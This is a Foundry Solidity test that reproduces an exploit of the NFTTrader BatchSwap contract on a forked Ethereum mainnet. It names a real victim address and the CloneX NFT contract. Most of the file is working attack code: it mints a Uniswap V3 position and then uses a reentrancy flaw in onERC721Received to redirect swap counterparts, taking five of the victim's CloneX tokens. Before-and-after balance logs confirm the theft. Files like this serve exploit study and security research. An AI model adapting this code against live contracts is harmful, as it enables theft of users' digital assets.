// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

import "@interface/IERC20.sol";
import "@interface/IERC721.sol";
import "@interface/IWETH9.sol";

import "./INonfungiblePositionManager.sol";
import "./IBatchSwap.sol";

IERC20 constant USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
WETH9 constant WETH = WETH9(
    payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2)
);
NonfungiblePositionManager constant UniV3PosNFT = NonfungiblePositionManager(
    payable(0xC36442b4a4522E871399CD717aBDD847Ab11FE88)
);
IBatchSwap constant NFTTrader = IBatchSwap(
    payable(0xC310e760778ECBca4C65B6C559874757A4c4Ece0)
);
IERC721 constant CloneX = IERC721(0x49cF6f5d44E70224e2E23fDcdd2C053F30aDA28B);
address constant victim = 0x23938954BC875bb8309AEF15e2Dead54884B73Db;
address constant tradeSquad = 0x58874d2951524F7f851bbBE240f0C3cF0b992d79;

contract NFTTraderTest is Test {
    uint256 private swapId;

    function setUp() public {
        vm.createSelectFork("mainnet", 18799414);
        vm.label(address(UniV3PosNFT), "UniV3PosNFT");
        vm.label(address(USDC), "USDC");
        vm.label(address(WETH), "WETH");
        vm.label(address(NFTTrader), "NFTTrader");
        vm.label(address(CloneX), "CloneX");
        vm.label(victim, "Victim");
        vm.label(tradeSquad, "tradeSquad");

        deal(address(this), 0.001 ether);
    }

    function testExploit() public {
        INonfungiblePositionManager.MintParams
            memory params = INonfungiblePositionManager.MintParams({
                token0: address(USDC),
                token1: address(WETH),
                fee: 500,
                tickLower: 0,
                tickUpper: 100_000,
                amount0Desired: 0,
                amount1Desired: address(this).balance,
                amount0Min: 0,
                amount1Min: 0,
                recipient: address(this),
                deadline: block.timestamp
            });

        (uint256 positionId, , , ) = UniV3PosNFT.mint{
            value: address(this).balance
        }(params);

        vm.roll(18799435);
        deal(address(this), 0.1 ether);

        UniV3PosNFT.setApprovalForAll(address(CloneX), true);

        vm.roll(18799487);
        UniV3PosNFT.setApprovalForAll(address(NFTTrader), true);

        require(CloneX.isApprovedForAll(victim, address(NFTTrader)));

        emit log_named_uint(
            "Victim CloneX balance before attack",
            CloneX.balanceOf(victim)
        );

        emit log_named_uint(
            "Exploiter CloneX balance before attack",
            CloneX.balanceOf(address(this))
        );

        uint256[] memory victimsCloneXTokenIds = new uint256[](
            CloneX.balanceOf(victim)
        );
        victimsCloneXTokenIds[0] = 6_670;
        victimsCloneXTokenIds[1] = 6_650;
        victimsCloneXTokenIds[2] = 4_843;
        victimsCloneXTokenIds[3] = 5_432;
        victimsCloneXTokenIds[4] = 9_870;

        for (uint8 i; i < victimsCloneXTokenIds.length; ++i) {
            BatchSwap.swapIntent memory _swapIntent = BatchSwap.swapIntent({
                id: 0,
                addressOne: address(0),
                valueOne: 0,
                addressTwo: address(this),
                valueTwo: 0,
                swapStart: 0,
                swapEnd: 0,
                swapFee: 0,
                status: 0
            });

            BatchSwap.swapStruct[] memory _nftsOne = new BatchSwap.swapStruct[](
                0
            );
            BatchSwap.swapStruct[] memory _nftsTwo = new BatchSwap.swapStruct[](
                2
            );
            uint256[] memory _tokenId1 = new uint256[](1);
            _tokenId1[0] = positionId;
            uint256[] memory _blc = new uint256[](0);
            _nftsTwo[0] = BatchSwap.swapStruct({
                dapp: address(UniV3PosNFT),
                typeStd: tradeSquad,
                tokenId: _tokenId1,
                blc: _blc,
                data: ""
            });

            uint256[] memory _tokenId2 = new uint256[](1);
            _tokenId2[0] = victimsCloneXTokenIds[i];
            _nftsTwo[1] = BatchSwap.swapStruct({
                dapp: address(CloneX),
                typeStd: tradeSquad,
                tokenId: _tokenId2,
                blc: _blc,
                data: ""
            });
            vm.recordLogs();
            NFTTrader.createSwapIntent{value: 0.005 ether}(
                _swapIntent,
                _nftsOne,
                _nftsTwo
            );
            Vm.Log[] memory entries = vm.getRecordedLogs();
            (swapId, ) = abi.decode(entries[0].data, (uint256, address));
            NFTTrader.closeSwapIntent{value: 0.005 ether}(
                address(this),
                swapId
            );
        }

        for (uint8 j; j < victimsCloneXTokenIds.length; ++j) {
            assertEq(CloneX.ownerOf(victimsCloneXTokenIds[j]), address(this));
        }

        emit log_named_uint(
            "Victim CloneX balance after attack",
            CloneX.balanceOf(victim)
        );

        emit log_named_uint(
            "Exploiter CloneX balance after attack",
            CloneX.balanceOf(address(this))
        );
    }

    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4) {
        operator;
        from;
        tokenId;
        data;
        // Flawed function. Lack of reentrancy protection
        NFTTrader.editCounterPart(swapId, victim);
        return this.onERC721Received.selector;
    }
}
